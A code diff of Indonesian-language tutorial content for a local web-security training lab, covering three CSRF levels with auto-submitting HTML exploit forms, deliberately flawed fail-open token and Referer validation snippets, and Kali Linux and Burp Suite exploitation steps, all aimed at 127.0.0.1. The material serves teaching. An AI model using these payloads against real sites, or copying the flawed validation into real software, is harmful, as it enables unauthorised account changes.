@@ -437,104 +437,185 @@ Host: 127.0.0.1:5000</code></pre>
 """,
         },
     },
-    "csrf": {
+"csrf": {
         "apprentice": {
-            "title": "CSRF tanpa Perlindungan Token",
-            "video_url": "https://www.youtube.com/embed/vYc2URBgJ8?si=3bLF1TLaIChNm8Zo",
-            "goal": "Eksploitasi kerentanan CSRF untuk mengubah alamat email pengguna. Buat <i>payload</i> HTML yang akan secara otomatis mengirimkan <i>request</i> pengubahan email saat dibuka oleh korban.",
+            "title": "Kerentanan CSRF dasar tanpa perlindungan token",
+            "goal": "Manfaatkan ketiadaan token CSRF untuk mengubah alamat email pengguna (korban) secara paksa.",
             "tutorial": """
-                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar CSRF</h3>
-                <p><b>Cross-Site Request Forgery (CSRF)</b> adalah kerentanan web yang memaksa pengguna yang sedang login untuk melakukan tindakan yang tidak mereka kehendaki pada aplikasi web yang mereka percayai. Penyerang tidak bisa melihat respons dari server, sehingga CSRF biasanya digunakan untuk tindakan yang mengubah <i>state</i> (status), seperti mengubah email, mentransfer dana, atau mengubah password.</p>
-                <p>Kerentanan ini muncul ketika aplikasi bergantung sepenuhnya pada <i>cookies</i> sesi (session cookies) untuk mengidentifikasi pengguna, dan tidak memiliki mekanisme perlindungan tambahan seperti <b>Anti-CSRF Token</b>.</p>
+<p>Endpoint <code>/lab/csrf/apprentice/email</code> memproses form pembaruan email menggunakan metode <code>POST</code> tanpa menerapkan perlindungan <em>Cross-Site Request Forgery</em> (CSRF). Tidak ada token unik (anti-CSRF token) yang divalidasi oleh <em>backend</em> untuk memastikan bahwa <em>request</em> tersebut benar-benar berasal dari antarmuka aplikasi yang sah.</p>
 
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kerentanan</h3>
-                <p>Pada lab ini, fitur pengubahan email menerima <i>request</i> POST ke <code>/lab/csrf/apprentice/email</code>. Jika Anda memeriksa <i>request</i> tersebut (menggunakan Burp Suite atau Network Tab), tidak ada parameter acak yang sulit ditebak (seperti token CSRF). Aplikasi hanya memvalidasi sesi cookie Anda.</p>
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Konsep Serangan</h3>
+<p class="mb-2">Sebagai penyerang, Anda perlu membuat sebuah halaman web berbahaya (HTML) yang memuat form tersembunyi. Form ini diarahkan ke URL target dan dikonfigurasi untuk terkirim secara otomatis. Saat korban (yang sedang <em>login</em> di aplikasi lab) mengunjungi halaman berbahaya Anda, <em>browser</em> korban akan secara otomatis mengirimkan <em>request</em> perubahan email dengan membawa <em>session cookie</em> korban yang sah.</p>
 
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi (Step-by-Step)</h3>
-                <ol class="list-decimal pl-5 space-y-2 mb-4">
-                    <li>Buka halaman lab dengan mengklik tombol <b>Akses Lab Interaktif</b> di bawah, dan masuk ke menu "Perbarui Email".</li>
-                    <li>Ubah email menjadi nilai apa saja (misal: <code>test@ifsec.local</code>) dan klik <b>Update Email</b>.</li>
-                    <li>Tangkap <i>request</i> POST tersebut menggunakan <b>Burp Suite Proxy</b>. Anda akan melihat parameter <i>body</i> hanya berisi <code>email=test%40ifsec.local</code>.</li>
-                    <li>Klik kanan pada <i>request</i> tersebut di Burp Suite, lalu pilih <b>Engagement tools -> Generate CSRF PoC</b> (jika Anda menggunakan Burp Professional), ATAU buat file HTML manual seperti di bawah ini.</li>
-                </ol>
-                
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Payload HTML Penyerang</h3>
-                <p>Simpan kode berikut sebagai file <code>exploit.html</code> di komputer Anda. Saat Anda membuka file ini di browser (dalam kondisi masih "login" di IFSEC Lab), form akan terkirim secara otomatis dan email Anda akan berubah menjadi email milik penyerang.</p>
-                <pre>&lt;html&gt;
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload HTML (Proof of Concept)</h3>
+<pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
     &lt;h1&gt;Anda memenangkan hadiah!&lt;/h1&gt;
     &lt;form action="http://127.0.0.1:5000/lab/csrf/apprentice/email" method="POST" id="csrf-form"&gt;
-      &lt;input type="hidden" name="email" value="hacked@attacker.com" /&gt;
+      &lt;input type="hidden" name="email" value="hacker@evil.local" /&gt;
     &lt;/form&gt;
     &lt;script&gt;
       // Mengirim form secara otomatis saat halaman dimuat
       document.getElementById("csrf-form").submit();
     &lt;/script&gt;
   &lt;/body&gt;
-&lt;/html&gt;</pre>
-            """
+&lt;/html&gt;</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Tools Kali Linux</h3>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Manual Web Hosting dengan Python</h4>
+<p class="text-sm text-gray-600 mb-2">Simulasikan server penyerang secara lokal menggunakan Python HTTP Server bawaan Kali Linux.</p>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka <strong>Terminal</strong> di Kali Linux.</li>
+    <li>Buat sebuah file HTML bernama <code>exploit.html</code> dan masukkan <em>payload HTML</em> di atas:
+        <pre><code class="language-bash">nano exploit.html
+# Tempelkan payload HTML, simpan (Ctrl+O, Enter) dan keluar (Ctrl+X)</code></pre>
+    </li>
+    <li>Jalankan web server lokal Python di direktori yang sama pada port 8000:
+        <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+    </li>
+    <li>Buka tab baru di <em>browser</em> Anda (pastikan Anda sedang berada dalam sesi <em>login</em> di IFSEC Lab).</li>
+    <li>Simulasikan korban yang mengklik tautan berbahaya dengan mengakses URL server penyerang Anda:
+        <pre><code>http://127.0.0.1:8000/exploit.html</code></pre>
+    </li>
+    <li>Sesaat setelah halaman dimuat, <em>browser</em> akan mengirimkan <em>request POST</em> secara otomatis ke lab. Kembali ke tab lab Anda dan <em>refresh</em> halamannya; email Anda kini telah berubah menjadi <code>hacker@evil.local</code>!</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Menggunakan Burp Suite (CSRF PoC Generator)</h4>
+<p class="text-sm text-gray-600 mb-2">Burp Suite memiliki fitur untuk membuatkan skrip HTML eksploitasi CSRF secara otomatis dari <em>request</em> yang sah.</p>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Pastikan Burp Suite menyala (<strong>Intercept is on</strong>).</li>
+    <li>Di <em>browser</em>, kirimkan form ganti email secara normal dengan email apa saja.</li>
+    <li>Kembali ke Burp Suite, <em>request POST</em> ke <code>/lab/csrf/apprentice/email</code> akan tertangkap.</li>
+    <li>Klik kanan pada <em>request</em> tersebut, pilih <strong>Engagement tools</strong> &gt; <strong>Generate CSRF PoC</strong>. <em>(Catatan: Fitur ini tersedia penuh di versi Professional, namun di versi Community Anda bisa menyalin strukturnya secara manual).</em></li>
+    <li>Ubah nilai parameter <code>email</code> di dalam jendela generator menjadi email penyerang (misal: <code>pwned@hacker.com</code>).</li>
+    <li>Klik tombol <strong>Test in browser</strong>, salin URL yang diberikan oleh Burp, dan buka di <em>browser</em> Anda.</li>
+    <li>Serangan CSRF akan tereksekusi dan email berhasil diubah tanpa persetujuan Anda.</li>
+</ol>
+""",
         },
-        "practitioner": {
-            "title": "Bypass Token CSRF via Penghapusan Parameter",
-            "video_url": "https://www.youtube.com/embed/PL9Gph7HAWA?si=Cki2msp4qYXbAGr7",
-            "goal": "Bypass mekanisme validasi token CSRF yang cacat dan ubah email korban. Backend pada lab ini hanya memvalidasi token <b>jika parameter tersebut dikirimkan</b>.",
+
+        
+"practitioner": {
+            "title": "Bypass CSRF melalui penghilangan parameter token",
+            "goal": "Ubah alamat email korban dengan mengeksploitasi validasi backend yang mengabaikan pengecekan saat parameter CSRF tidak dikirimkan.",
             "tutorial": """
-                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Logika Validasi yang Cacat</h3>
-                <p>Banyak developer mencoba mengimplementasikan Anti-CSRF token, namun membuat kesalahan pada logika validasinya. Salah satu kesalahan paling umum adalah <i>"Validate only if present"</i>. Backend hanya membandingkan token dari pengguna dengan token di sesi <b>apabila parameter <code>csrf</code> ada di dalam HTTP Request</b>. Jika parameter tersebut dihapus sepenuhnya, backend melewatkan blok validasi.</p>
+<p>Endpoint <code>/lab/csrf/practitioner/email</code> sebenarnya telah mengimplementasikan perlindungan CSRF dengan menanamkan <code>csrf_token</code> pada <em>form</em>. Namun, berdasarkan petunjuk, terdapat kecacatan logika pada level <em>backend</em>:</p>
+<pre><code class="language-python">submitted_token = request.form.get('csrf')
+# Cacat logika: backend hanya memvalidasi JIKA parameter csrf dikirimkan
+if submitted_token is not None:
+    if submitted_token != session['csrf_token']:
+        return "Token CSRF tidak valid"
+# Lanjut mengubah email...</code></pre>
 
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Langkah Eksploitasi</h3>
-                <ol class="list-decimal pl-5 space-y-2 mb-4">
-                    <li>Buka halaman lab. Anda akan melihat sebuah parameter <i>hidden</i> berupa <code>csrf</code> di dalam form pengubahan email.</li>
-                    <li>Lakukan percobaan pengubahan email, dan tangkap <i>request</i> POST menggunakan <b>Burp Suite</b>.</li>
-                    <li>Kirim <i>request</i> tersebut ke <b>Repeater</b>.</li>
-                    <li>Coba ubah nilai token <code>csrf</code> menjadi acak, lalu kirim (Send). Server akan menolak dengan pesan "CSRF token tidak valid".</li>
-                    <li>Sekarang, <b>hapus seluruh baris parameter csrf</b> (dan tanda <code>&</code> yang menghubungkannya) dari body request, sehingga body hanya tersisa <code>email=hacked@attacker.com</code>.</li>
-                    <li>Kirim <i>request</i> tersebut. Anda akan melihat bahwa server <b>menerima</b> perubahan email!</li>
-                </ol>
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Teknik Bypass (Parameter Omission)</h3>
+<p class="mb-2">Karena <em>backend</em> hanya melakukan verifikasi jika parameter <code>csrf</code> ada di dalam <em>request POST</em>, kita dapat melewati pertahanan ini secara keseluruhan dengan sekadar <strong>tidak menyertakan</strong> parameter tersebut dalam <em>payload</em> HTML jahat kita.</p>
 
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Pembuatan Payload PoC</h3>
-                <p>Karena kita tahu bahwa tidak mengirimkan parameter CSRF sama sekali akan mem-bypass validasi, <i>payload</i> eksploitasinya sama persis dengan level Apprentice, di mana form kita murni hanya mengirimkan parameter <code>email</code>.</p>
-                <pre>&lt;form action="http://127.0.0.1:5000/lab/csrf/practitioner/email" method="POST" id="csrf-form"&gt;
-  &lt;input type="hidden" name="email" value="pwned@attacker.com" /&gt;
-&lt;/form&gt;
-&lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;</pre>
-            """
-        },
-        "expert": {
-            "title": "Bypass Validasi Header Referer",
-            "video_url": "https://www.youtube.com/embed/vYc2UkRBgJ8?si=3bLF1TLaIChNm8Zo",
-            "goal": "Bypass sistem pelindungan CSRF yang bergantung pada HTTP Header <code>Referer</code> dengan cara memodifikasi <i>metadata</i> HTML pada halaman penyerang.",
-            "tutorial": """
-                <h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Kelemahan Validasi Referer</h3>
-                <p>Selain token acak, beberapa aplikasi menggunakan validasi Header <b>Referer</b> atau <b>Origin</b> untuk memastikan bahwa request dikirim dari domain yang sama. Namun, jika implementasinya cacat (misalnya mengizinkan request yang sama sekali <b>tidak memiliki Header Referer</b> demi alasan kompatibilitas browser lama), penyerang dapat mengeksploitasinya.</p>
-
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Langkah Analisis</h3>
-                <ol class="list-decimal pl-5 space-y-2 mb-4">
-                    <li>Tangkap <i>request</i> POST pengubahan email menggunakan Burp Suite, lalu kirim ke <b>Repeater</b>.</li>
-                    <li>Coba ubah nilai Header <code>Referer: http://127.0.0.1:5000/...</code> menjadi <code>Referer: http://google.com</code>. Server akan menolak request tersebut.</li>
-                    <li>Sekarang, hapus seluruh baris Header <code>Referer</code> dari request HTTP.</li>
-                    <li>Kirim request tersebut, dan Anda akan melihat bahwa server menerimanya! Ini berarti jika Referer kosong, server mengasumsikannya valid.</li>
-                </ol>
-
-                <h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Payload HTML (Suppressing Referer)</h3>
-                <p>Tantangannya adalah: bagaimana cara membuat browser korban <b>tidak</b> mengirimkan header Referer saat mengirim form dari web penyerang? Kita bisa menggunakan tag <code>&lt;meta name="referrer" content="never"&gt;</code> (atau <code>no-referrer</code>) pada bagian <code>&lt;head&gt;</code> HTML penyerang.</p>
-                <pre>&lt;html&gt;
-  &lt;head&gt;
-    &lt;!-- Tag ini memaksa browser membuang Header Referer --&gt;
-    &lt;meta name="referrer" content="no-referrer"&gt;
-  &lt;/head&gt;
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload HTML (Proof of Concept)</h3>
+<pre><code class="language-html">&lt;html&gt;
   &lt;body&gt;
-    &lt;form action="http://127.0.0.1:5000/lab/csrf/expert/email" method="POST" id="csrf-form"&gt;
-      &lt;input type="hidden" name="email" value="expert@attacker.com" /&gt;
+    &lt;h1&gt;Memuat Halaman...&lt;/h1&gt;
+    &lt;form action="http://127.0.0.1:5000/lab/csrf/practitioner/email" method="POST" id="csrf-form"&gt;
+      &lt;!-- Perhatikan: Input hidden untuk 'csrf' sengaja dihapus seluruhnya dari form ini --&gt;
+      &lt;input type="hidden" name="email" value="hacker@evil.local" /&gt;
     &lt;/form&gt;
     &lt;script&gt;
       document.getElementById("csrf-form").submit();
     &lt;/script&gt;
   &lt;/body&gt;
-&lt;/html&gt;</pre>
-            """
-        }
-    },
+&lt;/html&gt;</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Tools Kali Linux</h3>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Manual Web Hosting dengan Python</h4>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka <strong>Terminal</strong> di Kali Linux.</li>
+    <li>Buat file HTML eksploitasi:
+        <pre><code class="language-bash">nano exploit.html
+# Tempelkan payload HTML di atas, pastikan TIDAK ADA tag input untuk csrf
+# Simpan (Ctrl+O, Enter) dan keluar (Ctrl+X)</code></pre>
+    </li>
+    <li>Jalankan web server lokal bawaan Python:
+        <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+    </li>
+    <li>Simulasikan aktivitas korban dengan mengakses URL <code>http://127.0.0.1:8000/exploit.html</code> pada <em>browser</em> yang sedang memiliki sesi <em>login</em> aktif di IFSEC Lab.</li>
+    <li><em>Request POST</em> akan terkirim secara otomatis tanpa token, sukses melewati validasi <em>backend</em>, dan email berhasil diubah.</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Manipulasi Generator PoC di Burp Suite</h4>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Pastikan <strong>Intercept is on</strong> pada Burp Suite Anda.</li>
+    <li>Lakukan pembaruan email secara normal melalui halaman lab.</li>
+    <li>Pada jendela <em>Intercept</em>, Anda akan melihat <em>request POST</em> yang berisi dua parameter <em>body</em>, misal: <code>email=...&csrf=...</code>.</li>
+    <li>Klik kanan pada area <em>request</em> tersebut dan pilih <strong>Engagement tools &gt; Generate CSRF PoC</strong>.</li>
+    <li>Pada jendela generator, Burp Suite akan membuatkan HTML form yang menyertakan input <code>csrf</code> asli Anda. <strong>Blok dan hapus baris kode HTML untuk input <code>csrf</code> tersebut.</strong></li>
+    <li>Ubah <em>value</em> pada input <code>email</code> menjadi email target eksploitasi (contoh: <code>pwned@hacker.com</code>).</li>
+    <li>Klik <strong>Test in browser</strong>, salin URL yang diberikan, dan buka di <em>browser</em>. Kerentanan berhasil dieksploitasi dengan mengabaikan mekanisme validasi.</li>
+</ol>
+""",
+        },
+"expert": {
+            "title": "Bypass CSRF dengan memanipulasi Header Referer",
+            "goal": "Ubah alamat email korban dengan melewati mekanisme validasi berbasis Referer yang gagal (fail-open) saat header dihapus.",
+            "tutorial": """
+<p>Endpoint <code>/lab/csrf/expert/email</code> tidak menggunakan token CSRF pada <em>body request</em>, melainkan mengandalkan validasi pada tingkat HTTP Header, khususnya <strong>Header Referer</strong>, untuk memverifikasi dari mana <em>request</em> itu berasal.</p>
+<pre><code class="language-python">referer = request.headers.get('Referer')
+# Cacat logika: Validasi hanya dilakukan JIKA header Referer tidak kosong
+if referer is not None:
+    if '127.0.0.1:5000' not in referer:
+        return "Akses ditolak: Asal request tidak dikenali"
+# Jika Referer kosong (None), proses dilanjutkan mengubah email...</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Teknik Bypass (Menghilangkan Referer Header)</h3>
+<p class="mb-2">Banyak aplikasi menerapkan validasi Referer yang bersifat <em>"fail-open"</em> untuk mengakomodasi privasi pengguna tingkat lanjut atau proksi perusahaan yang memblokir header Referer. Sebagai penyerang, kita bisa memanfaatkan kelemahan ini dengan memerintahkan <em>browser</em> korban agar <strong>tidak mengirimkan</strong> header Referer sama sekali saat mengirim form, sehingga sukses melewati pengecekan di sisi <em>backend</em>.</p>
+
+<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload HTML (Proof of Concept)</h3>
+<pre><code class="language-html">&lt;html&gt;
+  &lt;head&gt;
+    &lt;!-- Tag meta ini menginstruksikan browser untuk TIDAK mengirimkan Header Referer --&gt;
+    &lt;meta name="referrer" content="no-referrer"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Memuat Halaman...&lt;/h1&gt;
+    &lt;form action="http://127.0.0.1:5000/lab/csrf/expert/email" method="POST" id="csrf-form"&gt;
+      &lt;input type="hidden" name="email" value="hacker@evil.local" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      document.getElementById("csrf-form").submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<h3 class="text-xl font-bold text-navy-900 mt-10 mb-3">Eksploitasi Menggunakan Tools Kali Linux</h3>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 1: Manual Web Hosting dengan Python</h4>
+<ol class="list-decimal ml-6 space-y-2 mb-8">
+    <li>Buka <strong>Terminal</strong> di Kali Linux.</li>
+    <li>Buat file HTML eksploitasi:
+        <pre><code class="language-bash">nano exploit.html
+# Tempelkan payload HTML di atas, pastikan tag &lt;meta name="referrer" ...&gt; ada di dalam &lt;head&gt;
+# Simpan (Ctrl+O, Enter) dan keluar (Ctrl+X)</code></pre>
+    </li>
+    <li>Jalankan web server lokal bawaan Python:
+        <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+    </li>
+    <li>Simulasikan korban dengan mengakses <code>http://127.0.0.1:8000/exploit.html</code> melalui <em>browser</em> (pastikan <em>browser</em> sedang <em>login</em> di akun lab).</li>
+    <li><em>Request POST</em> akan terkirim tanpa Header Referer. Cek lab Anda, email berhasil diubah karena <em>backend</em> meloloskan <em>request</em> yang tidak memiliki Referer.</li>
+</ol>
+
+<h4 class="text-lg font-bold text-navy-900 mt-6 mb-2">Metode 2: Menggunakan Burp Suite (Repeater & Generator)</h4>
+<ol class="list-decimal ml-6 space-y-2">
+    <li>Pastikan <strong>Intercept is on</strong> pada Burp Suite.</li>
+    <li>Ubah email secara normal di halaman lab untuk menangkap <em>request</em>.</li>
+    <li>Kirim <em>request</em> tersebut ke <strong>Repeater</strong> (<code>Ctrl+R</code>).</li>
+    <li>Pada tab <strong>Repeater</strong>, perhatikan panel sebelah kiri (bagian Header). Anda akan melihat baris: <code>Referer: http://127.0.0.1:5000/...</code>.</li>
+    <li>Untuk memvalidasi kerentanan secara manual, blok dan hapus seluruh baris <code>Referer</code> tersebut, ubah nilai <code>email=...</code> di bagian paling bawah, lalu klik <strong>Send</strong>. Jika Anda mendapat respons HTTP 200/302, kerentanan berhasil terkonfirmasi.</li>
+    <li>Untuk membuat PoC otomatis yang bisa disebarkan, klik kanan pada <em>request</em> asli (di <em>Proxy</em>/<em>Repeater</em>), pilih <strong>Engagement tools &gt; Generate CSRF PoC</strong>.</li>
+    <li>Klik tombol <strong>Options</strong> di jendela generator tersebut, lalu centang bagian <strong>Include auto-submit script</strong> dan pilih opsi khusus (jika tersedia di versi Pro) untuk men-<em>drop</em> Referer, atau cukup salin HTML standar dan tambahkan manual tag <code>&lt;meta name="referrer" content="never"&gt;</code> ke dalamnya.</li>
+</ol>
+"""
+}
+        },
     "clickjacking": {
         "apprentice": {
             "title": "Clickjacking Dasar tanpa Proteksi",
